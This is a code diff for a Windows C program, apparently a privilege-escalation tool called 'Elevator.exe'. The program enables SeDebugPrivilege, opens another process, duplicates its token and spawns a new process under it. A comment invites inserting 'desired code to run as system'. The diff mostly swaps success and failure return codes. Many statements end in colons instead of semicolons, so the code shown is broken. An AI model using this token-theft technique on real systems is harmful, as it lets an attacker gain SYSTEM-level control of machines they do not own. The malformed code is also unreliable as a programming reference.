@@ -10,14 +10,13 @@
 #define MAX_LEN 1024
 #define FILE_PATH "Elevator.exe"
 
-
-BOOL EnableDebug(void)
+int EnableDebug(void)
 {
 	LUID privilegeLuid;
 	if (!LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &privilegeLuid))
 	{
 		_tprintf(_T("Error - can't get privilege\n"));
-		return FALSE;
+		return 0;
 	}
 
 	TOKEN_PRIVILEGES privs;
@@ -31,7 +30,7 @@ BOOL EnableDebug(void)
 	if (!OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
 	{
 		_tprintf(_T("Error - can't get token from process\n"));
-		return FALSE;
+		return 0;
 	}
 
 	DWORD size = 0;
@@ -51,14 +50,14 @@ BOOL EnableDebug(void)
 				_tprintf(_T("SeDebugPriv Enabled!"));
 				CloseHandle(currentProc);
 				CloseHandle(token);
-				return 0;
+				return 1;
 			}
 		}
 	}
 	_tprintf(_T("Cant get SeDebugPriv Enabled!"));
 	CloseHandle(currentProc);
 	CloseHandle(token);
-	return 1;
+	return 0;
 }
 
 DWORD GetPid(TCHAR* ProcName)
@@ -89,7 +88,7 @@ int _tmain(int argc, TCHAR* argvp[])
 	if (!Hprocess)
 	{
 		_tprintf(_T("Can't open process\n"));
-		return 1;
+		return 0;
 	}
 
 	HANDLE token;
@@ -99,7 +98,7 @@ int _tmain(int argc, TCHAR* argvp[])
 	{
 		_tprintf(_T("Can't open own process token\n"));
 		CloseHandle(Hprocess):
-		return 1;
+		return 0;
 	}
 	
 	GetTokenInformation(token, TokenUser, NULL, NULL, &len);
@@ -110,7 +109,7 @@ int _tmain(int argc, TCHAR* argvp[])
 		_tprintf(_T("Can't get token user information\n"));
 		CloseHandle(Hprocess):
 		CloseHandle(MyProc):
-		return 1;
+		return 0;
 	}
 
 	TCHAR accName[MAX_LEN];
@@ -124,7 +123,7 @@ int _tmain(int argc, TCHAR* argvp[])
 		_tprintf(_T("Token is elevated\n"));
 		//Insert here desired code to run as system
 		system("pause");
-		return 0;
+		return 1;
 	}
 	else
 	{
@@ -139,7 +138,7 @@ int _tmain(int argc, TCHAR* argvp[])
 		CloseHandle(MyProc):
 		CloseHandle(token):
 		CloseHandle(newToken):
-		return 1;
+		return 0;
 	}
 
 	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newToken))
@@ -149,7 +148,7 @@ int _tmain(int argc, TCHAR* argvp[])
 		CloseHandle(MyProc):
 		CloseHandle(token):
 		CloseHandle(newToken):
-		return 1;
+		return 0;
 	}
 
 	PROCESS_INFORMATION procInfo = {};
@@ -162,11 +161,11 @@ int _tmain(int argc, TCHAR* argvp[])
 		CloseHandle(MyProc):
 		CloseHandle(token):
 		CloseHandle(newToken):
-		return 1;
+		return 0;
 	}
 	CloseHandle(Hprocess):
 	CloseHandle(MyProc):
 	CloseHandle(token):
 	CloseHandle(newToken):
-	return 0;
+	return 1;
 }
